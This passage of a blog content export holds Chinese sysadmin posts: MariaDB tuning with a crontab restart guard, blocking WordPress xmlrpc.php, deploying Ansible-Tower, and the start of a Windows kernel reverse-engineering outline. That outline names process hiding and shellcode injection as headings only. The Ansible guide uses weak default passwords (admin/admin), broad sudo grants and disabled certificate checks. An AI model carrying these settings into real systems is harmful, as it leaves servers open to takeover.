<span class="token number">128.00000000</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若要变更，只需在Mariadb配置文件修改·innodb_buffer_pool_size·参数大小即可。</p><p>默认情况下，Centos的Mariadb配置文件位置为：</p><blockquote><p>/etc/my.cnf</p></blockquote><p>但是官方并不推荐修改这个配置文件，因为当Mariadb升级时很可能会将其覆盖掉。不过这个配置文件会包含了一个配置目录<code>/etc/my.cnf.d</code>，其下的全部配置文件都会被包含进来。默认情况下，目录<code>/etc/my.cnf.d</code>内有三个配置文件：</p><blockquote><p>/etc/my.cnf.d/client.cnf<br>/etc/my.cnf.d/mysql-clients.cnf<br>/etc/my.cnf.d/server.cnf</p></blockquote><p>一般情况下，我们只需修改<code>/etc/my.cnf.d/server.cnf</code>配置文件即可。但是也可以在<code>/etc/my.cnf.d</code>目录下创建新的配置文件（它将被<code>/etc/my.cnf</code>自动包含）。</p><p>在本例中我们选择后者，即在<code>/etc/my.cnf.d</code>目录下创建新的配置文件。</p><p>打开<code>/usr/share/mysql</code>目录，可以发现这里有一些现成的mysql数据库样例配置文件，对应不同的使用场景：</p><blockquote><p>my-huge.cnf<br>my-innodb-heavy-4G.cnf<br>my-large.cnf<br>my-medium.cnf<br>my-small.cnf</p></blockquote><p>这里把<code>my-medium.cnf</code>拷贝过来：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/mysql/my-medium.cnf /etc/my.cnf.d/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过命令<code>vi /etc/my.cnf.d/my-medium.cnf</code>编辑配置文件，找到<code>innodb_buffer_pool_size</code>参数，去掉前面的#注释并修改成期望的大小即可（本文改成了32M）。</p><p>修改完成后，需重启Mariadb服务使其生效：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart mariadb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="附2：利用crontab守护Mariadb"><a href="#附2：利用crontab守护Mariadb" class="headerlink" title="附2：利用crontab守护Mariadb"></a>附2：利用crontab守护Mariadb</h2><p>作为备用方案，可利用crontab实时监控Mariadb的进程状态，万一崩溃则自动重启Mariadb进程，这样在最坏的情况下也能保证站点的正常使用了。</p><p>crontab是Centos内置的定时计划服务，可以用以下命令启动和停止服务：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start crond.service   <span class="token comment" spellcheck="true"># 启动crontab服务</span>systemctl stop crond.service    <span class="token comment" spellcheck="true"># 停止crontab服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用<code>crontab -e</code>命令在crontab添加一行计划任务（拷贝下面的命令到末尾保存即可）：<font color="red">每分钟对Mariadb进程进行检查，若进程不存在则重新启动数据库服务</font>：</p><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * <span class="token keyword">if</span> <span class="token punctuation">[</span> -z `ps -ef<span class="token operator">|</span><span class="token function">grep</span> mariadb<span class="token operator">|</span><span class="token function">grep</span> -v <span class="token function">grep</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span>` <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span> systemctl start mariadb<span class="token punctuation">;</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 此计划任务解释：</span><span class="token comment" spellcheck="true"># */1 * * * *： 是cron表达式，这里表示每分钟执行一次。cron的语法可自行谷歌或百度</span><span class="token comment" spellcheck="true"># ps -ef：表示查看当前运行中的进程列表</span><span class="token comment" spellcheck="true"># grep mariadb：表示仅保留包含mariadb关键字的进程</span><span class="token comment" spellcheck="true"># grep -v grep：表示排除包含grep关键字的进程</span><span class="token comment" spellcheck="true"># awk '{print $2}'：表示提取进程号</span><span class="token comment" spellcheck="true"># -z：表示判断进程号是否为空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重载或重启crontab使配置生效：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl reload crond.service   <span class="token comment" spellcheck="true"># 重载crontab配置</span>systemctl restart crond.service   <span class="token comment" spellcheck="true"># 重启crontab服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过<code>crontab -l</code>命令可确认当前用户的计划任务列表。</p><p>需注意crontab默认不会开机自启，可编辑<code>vi /etc/rc.d/rc.local</code>文件，在末尾添加以下内容并保存即可：</p><blockquote><p>systemctl start crond.service</p></blockquote><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10657460">本文全文下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mariadb </tag>
            
            <tag> WordPress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>禁用 XMLRPC 避免 WP 站点被 DDOS 或暴力登录</title>
      <link href="/articles/website/jin-yong-xmlrpc-bi-mian-ddos/"/>
      <url>/articles/website/jin-yong-xmlrpc-bi-mian-ddos/</url>
      
        <content type="html"><![CDATA[<h2 id="诱因"><a href="#诱因" class="headerlink" title="诱因"></a>诱因</h2><p>自从使用 Wordpress 建站以来，就一直被机器人暴力爆破登录密码，其规模已经足以引起DDos攻击，导致服务器启动没多久，资源就被耗尽，打开极其缓慢。</p><p>即使安装 Limit Login Attempts 插件进行登录限制，依然会被机器人用 IP 池持续攻击，成效甚微：</p><p><img src="./01.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从 Limit Login Attempts 插件的限制日志可以发现， 通过 XMLRPC 登录的次数远远大于通过 WP Login 登录的次数。</p><p>WP Login 就是通过 http://${site-url}/wp-login.php 直接登录， Limit Login Attempts 插件会加上校验码，使其不容易被爆破。</p><p>而 XMLRPC 的全称是 XML Remote Procedure Call，即 XML远程方法调用。它是 XHR （即 XMLHttpRequest）的一种实现，其交互消息都是基于 HTTP-POST 请求，请求的内容是 XML，服务端的返回结果同样也是 XML。</p><p>对于爬虫机器人而言，相对于 WP Login 方式，使用 XMLRPC 会更方便。因为前者更接近仿真方式登录，而后者则是纯脚本交互，而且可以绕过 Limit Login Attempts 等插件对登录页面的保护。</p><h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><p>知道根源，处理就很简单了。因为作为站长，一般是用不到 XMLRPC 去管理自己站点的，所以禁用它即可。</p><p>而禁用的方法有很多，最简单直接的方法，就是修改网站后台根目录的 <code>.htaccess</code> 文件，在末尾加上这段内容即可：</p><pre class="line-numbers language-xml"><code class="language-xml"># forbit xmlrpc.php request (crawler, ddos, ...)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Files</span> <span class="token attr-name">xmlrpc.php</span><span class="token punctuation">></span></span>order deny,allowdeny from all<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Files</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> XMLRPC </tag>
            
            <tag> DDOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ansible-Tower 部署笔记</title>
      <link href="/articles/scm/ansibletower-bu-shu-bi-ji/"/>
      <url>/articles/scm/ansibletower-bu-shu-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为时下最流行的自动化运维工具之一，Ansible 在业界应该是无人不知无人不晓的了。</p><p>作为一款轻量化的开源软件，它只需要简单地通过 SSH（对Linux平台）或 PowerShell（对Windows平台），无需被控主机安装客户端，就能实现远程操控、部署、升级等配置管理。</p><p>通过编写简单的 playbooks（yml） 脚本就能轻松对成千上万的主机进行区域管控、日常巡检等任务。</p><p>而 Ansible-Tower （旧称 AWX）作为其配套界面，使得 Ansible 更容易上手。</p><p><img src="./01.png"></p><p>这里提供一些官方资料：</p><ul><li><a href="https://www.ansible.com/">Ansible 官网</a> : <a href="https://www.ansible.com/">https://www.ansible.com/</a></li><li><a href="https://www.ansible.com/products/tower">Ansible-Tower 官网</a> : <a href="https://www.ansible.com/products/tower">https://www.ansible.com/products/tower</a></li><li><a href="https://docs.ansible.com/">Ansible 官方文档（全）</a> : <a href="https://docs.ansible.com/">https://docs.ansible.com/</a></li><li><a href="https://docs.ansible.com/ansible/latest/index.htmll">Ansible 官方教程（英文版）</a> : <a href="https://docs.ansible.com/ansible/latest/index.html">https://docs.ansible.com/ansible/latest/index.html</a></li><li><a href="http://www.ansible.com.cn/docs/intro.html">Ansible 官方教程（中文版）</a> : <a href="http://www.ansible.com.cn/docs/intro.html">http://www.ansible.com.cn/docs/intro.html</a></li><li><a href="https://github.com/ansible">Ansible Github</a> : <a href="https://github.com/ansible">https://github.com/ansible</a></li></ul><h2 id="1-部署说明"><a href="#1-部署说明" class="headerlink" title="1. 部署说明"></a>1. 部署说明</h2><p>本文主要记录了在 ubuntu 上部署 Ansible 和 Ansible-Tower 的过程。</p><p>虽然 Ansible-Tower 支持在多种操作系统版本上部署，但对于 ubuntu 只支持 14.0 和 16.0 两个版本（而 Ansible 则是支持到 ubuntu 18.0）。</p><p>为了可以同时安装 Ansible 和 Ansible-Tower ，本文选择了 ubuntu 16.0 系统进行安装。</p><h3 id="1-1-安装环境"><a href="#1-1-安装环境" class="headerlink" title="1.1. 安装环境"></a>1.1. 安装环境</h3><ul><li><strong>操作系统</strong>：Ubuntu 16.04.5 LTS</li><li><strong>预装软件</strong>：python 2.7、openssh</li></ul><h3 id="1-2-安装清单"><a href="#1-2-安装清单" class="headerlink" title="1.2. 安装清单"></a>1.2. 安装清单</h3><ul><li>pywinrm （要求版本至少为 0.2.2，若不管理 windows 机器则无需安装）</li><li>Ansible-2.7.5 （ 要求 python 版本 2.6 或 2.7 ）</li><li>PostgreSQL-9.6</li><li>Ansible-Tower-3.3.3 （ 要求 Ansible 版本至少为 2.2，PostgreSQL版本至少为 9.6 ）</li></ul><blockquote><p><strong>预装组件要求可查看官方手册指引</strong>：<a href="https://docs.ansible.com/ansible-tower/latest/html/quickinstall/prepare.html">https://docs.ansible.com/ansible-tower/latest/html/quickinstall/prepare.html</a></p></blockquote><h2 id="2-安装步骤"><a href="#2-安装步骤" class="headerlink" title="2. 安装步骤"></a>2. 安装步骤</h2><p>注意下述步骤直接依次复制执行即可完成整个部署流程，其中对于命令行前缀：</p><ul><li>【#】表示 root 用户</li><li>【$】表示普通用户</li></ul><h3 id="2-1-安装-pywinrm（可选）"><a href="#2-1-安装-pywinrm（可选）" class="headerlink" title="2.1. 安装 pywinrm（可选）"></a>2.1. 安装 pywinrm（可选）</h3><pre><code># apt install python-pip            # 安装 pip# pip install --upgrade pip            # 更新 pip# pip install "pywinrm&gt;=0.2.2"        # 使用 pip 安装 pywinrm，此模块用于远程管理 windows 机器</code></pre><h3 id="2-2-添加相关用户并授权"><a href="#2-2-添加相关用户并授权" class="headerlink" title="2.2. 添加相关用户并授权"></a>2.2. 添加相关用户并授权</h3><pre><code># adduser ansible                    # 添加 ansible 专用用户# chmod u+w /etc/sudoers            # 修改 sudo 配置文件为可写# vi /etc/sudoers                    # 修改 sudo 配置文件，对 ansible 和 postgres 用户授权，便于后面安装root ALL=(ALL:ALL) ALLansible ALL=(ALL:ALL) ALLawx ALL=(ALL:ALL) ALL                # 安装 Ansible-Tower 时自动创建的用户postgres ALL=(ALL:ALL) ALL            # 安装 PostgreSQL 时自动创建的用户# chmod u-w /etc/sudoers</code></pre><h3 id="2-3-安装-Ansbile-2-7-5"><a href="#2-3-安装-Ansbile-2-7-5" class="headerlink" title="2.3. 安装 Ansbile-2.7.5"></a>2.3. 安装 Ansbile-2.7.5</h3><blockquote><p><strong>相关过程整理自官方手册</strong>：<a href="https://ansible-tran.readthedocs.io/en/latest/docs/intro_installation.html#apt-ubuntu">https://ansible-tran.readthedocs.io/en/latest/docs/intro_installation.html#apt-ubuntu</a></p></blockquote><pre><code># su - ansible                                        # 切换到 ansible 用户$ sudo apt-get install software-properties-common     # 在早期 Ubuntu 发行版中, “software-properties-common” 名为 “python-software-properties”，根据实际情况修改$ sudo apt-add-repository ppa:ansible/ansible$ sudo apt-get update$ sudo apt-get install ansible                        # 安装$ ansible --version                                    # 若安装成功，核验版本ansible 2.7.5config file = /etc/ansible/ansible.cfgconfigured module search path = [u'/home/ansible/.ansible/plugins/modules', u'/usr/share/ansible/plugins/modules']ansible python module location = /usr/lib/python2.7/dist-packages/ansibleexecutable location = /usr/bin/ansiblepython version = 2.7.15rc1 (default, Nov 12 2018, 14:31:15) [GCC 7.3.0]</code></pre><blockquote><p><strong>关于 Asible 的相关配置</strong>：<br>　　　○ 配置文件位置为 <code>/etc/ansible/ansible.cfg</code><br>　　　○ 主机清单文件为 <code>/etc/ansible/hosts</code> （用于配置主机分组、连接方式等）<br>　　　○ playbooks 目录位置默认为 <code>/etc/ansible/</code> ，若目录不存在，可手工创建</p></blockquote><h3 id="2-4-安装-PostgreSQL-9-6"><a href="#2-4-安装-PostgreSQL-9-6" class="headerlink" title="2.4. 安装 PostgreSQL-9.6"></a>2.4. 安装 PostgreSQL-9.6</h3><blockquote><p><strong>部分过程参考自CSDN</strong>：<a href="https://blog.csdn.net/zpf336/article/details/50843674">https://blog.csdn.net/zpf336/article/details/50843674</a></p></blockquote><pre><code># 注意 Ubuntu 16.0 默认的 PostgreSQL 安装源是 9.5 版本的，不符合要求，需要更新安装源后再安装$ sudo add-apt-repository "deb http://apt.postgresql.org/pub/repos/apt/ xenial-pgdg main"$ wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -$ sudo apt-get update$ sudo apt-get install postgresql-9.6# 安装完成后会自动新增数据库用户 postgres$ sudo su postgres                                    $ psql postgres                                 # 登录数据库ALTER USER postgres with PASSWORD 'postgres';     # 修改 postgres 用户的数据库密码\q                                                 # 退出数据库# 修改数据库配置（ 默认只允许本地连接，由于只有 Ansible-Tower 用，因此无需更改相关连接配置 ）$ vi /etc/postgresql/&lt;pg_version&gt;/main/postgresql.conf    # 此处的 &lt;pg_version&gt; 根据实际安装的 PostgreSQL 版本修改password_encryption = on                                # 去掉注释，启用密码验证登录方式# 重启数据库使配置生效$ sudo systemctl unmask postgresql$ sudo systemctl restart postgresql$ psql -U postgres -h 127.0.0.1                        # 测试本地账密登录CREATE USER ansible WITH PASSWORD 'ansible';         # 创建 Ansible-Tower 用的数据库用户 ansibleCREATE DATABASE tower OWNER ansible;                 # 创建 Ansible-Tower 用的数据库 towerGRANT ALL PRIVILEGES ON DATABASE tower TO ansible;    # 把 tower 库的所有权限授权给 ansible 用户\q                                                    # 退出数据库# 测试使用 ansible 用户登录 tower 数据库：$ psql -U ansible -h 127.0.0.1 -d tower\q# 可选（需图形界面支持）$ sudo apt-get install pgadmin3        # 可安装 PostgreSQL 库的图形客户端$ pgadmin3                             # 启动客户端</code></pre><h3 id="2-5-安装-Ansible-Tower-3-3-3"><a href="#2-5-安装-Ansible-Tower-3-3-3" class="headerlink" title="2.5. 安装 Ansible-Tower-3.3.3"></a>2.5. 安装 Ansible-Tower-3.3.3</h3><blockquote><p><strong>相关过程整理自官方手册</strong>：<a href="https://docs.ansible.com/ansible-tower/latest/html/quickinstall/download_tower.html">https://docs.ansible.com/ansible-tower/latest/html/quickinstall/download_tower.html</a></p></blockquote><blockquote><p><strong>部分过程参考自CSDN</strong>：<a href="https://blog.csdn.net/CodyGuo/article/details/78875717">https://blog.csdn.net/CodyGuo/article/details/78875717</a></p></blockquote><p>在 ubuntu 系统下，Ansible-Tower 只能下载 Ansible 的 playbooks 脚本，由 Ansible 在线安装。</p><p>playbooks 脚本可从 <a href="https://releases.ansible.com/ansible-tower/setup/?extIdCarryOver=true&amp;sc_cid=701f2000001OH6uAAG"><strong>此处</strong></a> 提取（目前最后的 latest 版是3.3.3）。</p><p>下载最后版本 <a href="https://releases.ansible.com/ansible-tower/setup/?extIdCarryOver=true&amp;sc_cid=701f2000001OH6uAAG"><code>ansible-tower-setup-latest.tar.gz</code></a> 后，上传到任意目录即可。</p><pre><code># 上传到 ansible-tower-setup-latest.tar.gz 到 /tmp 目录$ sudo su ansible                                    # 切换 ansible 用户执行安装过程$ tar xvzf ansible-tower-setup-latest.tar.gz        # 解包$ cd ansible-tower-setup-&lt;tower_version&gt;            # tower_version 根据实际的 Ansible-Tower 版本号修改$ vi inventory                                         # 修改安装配置，根据前面流程设置的参数对号入座即可[tower]localhost ansible_connection=local[database][all:vars]admin_password='admin'pg_host='127.0.0.1'pg_port='5432'pg_database='tower'pg_username='ansible'pg_password='ansible'rabbitmq_username=towerrabbitmq_password='admin'rabbitmq_cookie=cookiemonster# 执行安装$ sudo ./setup.sh</code></pre><h3 id="2-6-Ansible-Tower授权"><a href="#2-6-Ansible-Tower授权" class="headerlink" title="2.6. Ansible-Tower授权"></a>2.6. Ansible-Tower授权</h3><ul><li>安装成功后，可通过访问 <code>https://&lt;host_ip&gt;/</code> 登录 Ansible-Tower （<strong>只能使用 HTTPS 协议</strong>）</li><li>登录账密在前面安装时已配置为：admin/admin （登录成功后，可以在【Users】里面修改）</li><li>登录成功后需要导入License授权，License 可以在官网申请，官方提供了 10 个管理节点的 <a href="https://www.ansible.com/products/tower/trial?utm_campaign=Ansible+Tower+Product+Page&amp;utm_source=Website&amp;utm_medium=Ansible+Tower+Product+Page+Top+Banner+CTA&amp;hsCtaTracking=c2fa5df2-93a1-436f-bc6b-3b6c3814a3b2%7C63159af0-e463-4910-8b16-3a0c19224977">免费 License</a></li></ul><h2 id="3-附：被控主机为-Windows-时的额外配置"><a href="#3-附：被控主机为-Windows-时的额外配置" class="headerlink" title="3. 附：被控主机为 Windows 时的额外配置"></a>3. 附：被控主机为 Windows 时的额外配置</h2><blockquote><p><strong>相关内容参考自</strong>：<br>　　　○ 官方指引手册（英文版）：<a href="https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html">https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html</a><br>　　　○ 官方指引手册（中文版）：<a href="https://ansible-tran.readthedocs.io/en/latest/docs/intro_windows.html#">https://ansible-tran.readthedocs.io/en/latest/docs/intro_windows.html#</a><br>　　　○ 百度百家号：<a href="https://baijiahao.baidu.com/s?id=1580415145694814528&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1580415145694814528&amp;wfr=spider&amp;for=pc</a></p></blockquote><p>为了控制 Windows 主机，作为被控端的 Windows 必须具备以下几个条件：</p><ul><li>操作系统版本限制为：桌面版 Windows 7、8.1、10 ；服务器版 Windows Server 2008、2012、2016</li><li>Windows上必须已经安装了 PowerShell 3.0 或更新版本</li><li>Windows上必须已经安装了 .NET Framework 4.0 或更新版本</li><li>WinRM 服务已经被创建并启动服务，相关服务端口没有被防火墙等拦截</li></ul><h3 id="3-1-查看-PowerShell-与-NET-版本并升级"><a href="#3-1-查看-PowerShell-与-NET-版本并升级" class="headerlink" title="3.1. 查看 PowerShell 与 .NET 版本并升级"></a>3.1. 查看 PowerShell 与 .NET 版本并升级</h3><ul><li>运行 PowerShell  （注意不是 CMD，一般 Win8 之后都默认安装）</li><li>输入命令 <code>Get-Host</code> 可查看当前 PowerShell 版本</li><li>输入命令 <code>$PSVersionTable.CLRVersion</code> 可查看当前 .NET Framework 版本</li><li>若 PowerShell 版本不满足要求，可参考 <a href="https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html#upgrading-powershell-and-net-framework"><strong>此处</strong></a> 的升级步骤进行升级</li></ul><p><img src="./02.png"></p><h3 id="3-2-安装并查看-WinRM-服务"><a href="#3-2-安装并查看-WinRM-服务" class="headerlink" title="3.2. 安装并查看 WinRM 服务"></a>3.2. 安装并查看 WinRM 服务</h3><ul><li>详细安装步骤可参考 <a href="https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html#winrm-setup"><strong>这里</strong></a></li><li>为方便起见，Ansible 官方已提供了 WinRM 的自动安装与配置脚本：<a href="https://github.com/ansible/ansible/blob/devel/examples/scripts/ConfigureRemotingForAnsible.ps1">https://github.com/ansible/ansible/blob/devel/examples/scripts/ConfigureRemotingForAnsible.ps1</a></li><li>下载脚本后，在 PowerShell 执行命令即可完成安装： <code>powershell.exe -ExecutionPolicy ByPass -File ConfigureRemotingForAnsible.ps1</code></li><li>安装完成后，输入命令 <code>winrm enumerate winrm/config/Listener</code> 或 <code>winrm qc</code> 可查看 WinRM 的服务状态</li><li>确认 WinRM 正在监听 HTTPS 5986 端口即配置成功，注意防火墙也要开放相关端口</li></ul><p><img src="./03.png"></p><h3 id="3-3-Ansible-测试-WinRM-连接"><a href="#3-3-Ansible-测试-WinRM-连接" class="headerlink" title="3.3. Ansible 测试 WinRM 连接"></a>3.3. Ansible 测试 WinRM 连接</h3><blockquote><p>注意，Ansible 主机必须已安装 pywinrm，相关步骤详见 <a href="http://exp-blog.com/2019/01/19/pid-3070/#2">这里</a></p></blockquote><p><strong>测试方法：</strong>修改 Ansible 主机的配置文件 <code>/etc/ansible/hosts</code>，在其末尾添加一行（其中 <code>${win_ip}</code>、 <code>${win_username}</code>、 <code>${win_password}</code> 需根据实际情况修改）：</p><pre><code>${win_ip} ansible_user="${win_username}" ansible_password="${win_password}" ansible_port="5986" ansible_connection="winrm" ansible_winrm_server_cert_validation="ignore" ansible_winrm_transport="ssl"</code></pre><p>然后执行命令 <code>ansible ${win_ip} -m win_ping</code> 即可，若响应为 pong 则配置成功：</p><p><img src="./04.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 软件配置管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ansible </tag>
            
            <tag> 版本控制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WINDOWS 内核学习顺序指引清单</title>
      <link href="/articles/re/windows-nei-he-xue-xi-qing-dan/"/>
      <url>/articles/re/windows-nei-he-xue-xi-qing-dan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>鉴于很多同学想学习 <font color="red"><strong>逆向工程</strong></font>，但是找不到切入点导致无从入手，因此编写了这个指引清单。</p><p>本文原则上只是一个<font color="red">学习指引目录</font>（虽然部分章节有提供一些资料），因涉及知识面太多，具体内容以后再逐渐填充。</p><p>有兴趣的同学可根据指引清单，先行逐步扩展学习每个知识点。当整个清单都弄懂了，也就入门了（<strong>对的，你没看错，只是入门</strong>）。</p><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><h3 id="1-1-驱动框架（NT和WDM）"><a href="#1-1-驱动框架（NT和WDM）" class="headerlink" title="1.1. 驱动框架（NT和WDM）"></a>1.1. 驱动框架（NT和WDM）</h3><ul><li>《<a href=" http://blog.csdn.net/msk10k/article/details/51226666" target="_blank" rel="nofollow">NT - WDM - WDF 驱动概念</a>》</li></ul><h3 id="1-2-驱动基础（编程概念、内核函数、基本数据结构等等）"><a href="#1-2-驱动基础（编程概念、内核函数、基本数据结构等等）" class="headerlink" title="1.2. 驱动基础（编程概念、内核函数、基本数据结构等等）"></a>1.2. 驱动基础（编程概念、内核函数、基本数据结构等等）</h3><ul><li>《<a href="http://blog.csdn.net/erin45/article/details/7401678" target="_blank" rel="nofollow">WDM驱动程序的基本结构和实例</a>》</li><li>《<a href="http://blog.csdn.net/huangxy10/article/details/15307061" target="_blank" rel="nofollow">Windows驱动开发常用的数据结构</a>》</li><li>《<a href="http://blog.csdn.net/baggiowangyu/article/details/7936414" target="_blank" rel="nofollow">内存管理</a>》</li><li>《<a href="http://blog.csdn.net/whw8007/article/details/8865231" target="_blank" rel="nofollow">CE驱动开发常用宏定义</a>》</li><li>《<a href="http://blog.csdn.net/chenlycly/article/details/52777707" target="_blank" rel="nofollow">windows 内核函数前缀解析</a>》</li><li>《<a href="http://blog.csdn.net/lanuage/article/details/53413391" target="_blank" rel="nofollow">Windows常用内核函数</a>》</li></ul><h3 id="1-3-驱动通信（R3主动与R0通信、R0主动与R3交互）"><a href="#1-3-驱动通信（R3主动与R0通信、R0主动与R3交互）" class="headerlink" title="1.3. 驱动通信（R3主动与R0通信、R0主动与R3交互）"></a>1.3. 驱动通信（R3主动与R0通信、R0主动与R3交互）</h3><ul><li>R3：用户层</li><li>R0：内核层</li><li>《<a href="http://www.cnblogs.com/pcajax/archive/2011/03/16/1986407.html" target="_blank" rel="nofollow">ring0和ring3的区别</a>》</li></ul><h3 id="1-4-基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）"><a href="#1-4-基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）" class="headerlink" title="1.4. 基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）"></a>1.4. 基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）</h3><p>……</p><h2 id="2-进程相关"><a href="#2-进程相关" class="headerlink" title="2. 进程相关"></a>2. 进程相关</h2><h3 id="2-1-枚举进程（PID、EPROCESS、进程路径等）"><a href="#2-1-枚举进程（PID、EPROCESS、进程路径等）" class="headerlink" title="2.1. 枚举进程（PID、EPROCESS、进程路径等）"></a>2.1. 枚举进程（PID、EPROCESS、进程路径等）</h3><ul><li>《<a href="http://blog.csdn.net/yangluoning/article/details/14647969" target="_blank" rel="nofollow">四种方法实现VC枚举系统当前进程</a>》</li><li>《<a href="http://blog.csdn.net/zhongbin104/article/details/7867309" target="_blank" rel="nofollow">C++枚举进程的方法</a>》</li><li>《<a href="http://blog.csdn.net/myjisgreat/article/details/46481497" target="_blank" rel="nofollow">IsWow64Process函数理解的偏差</a>》</li></ul><h3 id="2-2-结束进程（多种方法）"><a href="#2-2-结束进程（多种方法）" class="headerlink" title="2.2. 结束进程（多种方法）"></a>2.2. 结束进程（多种方法）</h3><p>……</p><h3 id="2-3-挂起进程"><a href="#2-3-挂起进程" class="headerlink" title="2.3. 挂起进程"></a>2.3. 挂起进程</h3><p>……</p><h3 id="2-4-恢复进程"><a href="#2-4-恢复进程" class="headerlink" title="2.4. 恢复进程"></a>2.4. 恢复进程</h3><p>……</p><h3 id="2-5-保护进程（API-HOOK、回调）"><a href="#2-5-保护进程（API-HOOK、回调）" class="headerlink" title="2.5. 保护进程（API HOOK、回调）"></a>2.5. 保护进程（API HOOK、回调）</h3><p>……</p><h3 id="2-6-隐藏进程（API-HOOK、DKOM）"><a href="#2-6-隐藏进程（API-HOOK、DKOM）" class="headerlink" title="2.6. 隐藏进程（API HOOK、DKOM）"></a>2.6. 隐藏进程（API HOOK、DKOM）</h3><p>……</p><h3 id="2-7-枚举线程"><a href="#2-7-枚举线程" class="headerlink" title="2.7. 枚举线程"></a>2.7. 枚举线程</h3><p>……</p><h3 id="2-8-结束线程（多种方法）"><a href="#2-8-结束线程（多种方法）" class="headerlink" title="2.8. 结束线程（多种方法）"></a>2.8. 结束线程（多种方法）</h3><p>……</p><h3 id="2-9-挂起线程"><a href="#2-9-挂起线程" class="headerlink" title="2.9. 挂起线程"></a>2.9. 挂起线程</h3><p>……</p><h3 id="2-10-恢复线程"><a href="#2-10-恢复线程" class="headerlink" title="2.10. 恢复线程"></a>2.10. 恢复线程</h3><p>……</p><h3 id="2-11-枚举DLL（多种方法）"><a href="#2-11-枚举DLL（多种方法）" class="headerlink" title="2.11. 枚举DLL（多种方法）"></a>2.11. 枚举DLL（多种方法）</h3><p>……</p><h3 id="2-12-卸载DLL"><a href="#2-12-卸载DLL" class="headerlink" title="2.12. 卸载DLL"></a>2.12. 卸载DLL</h3><p>……</p><h3 id="2-13-注入DLL-SHELLCODE（NT6注入到系统进程）"><a href="#2-13-注入DLL-SHELLCODE（NT6注入到系统进程）" class="headerlink" title="2.13. 注入DLL/SHELLCODE（NT6注入到系统进程）"></a>2.13. 注入DLL/SHELLCODE（NT6注入到系统进程）</h3><p>……</p><h3 id="2-14-RING3-INLINE-HOOK-UNHOOK-绕过（多种方法）"><a href="#2-14-RING3-INLINE-HOOK-UNHOOK-绕过（多种方法）" class="headerlink" title="2.14. RING3 INLINE HOOK/UNHOOK/绕过（多种方法）"></a>2.14. RING3 INLINE HOOK/UNHOOK/绕过（多种方法）</h3><p>……</p><h3 id="2-15-RING3-EAT-HOOK-UNHOOK"><a 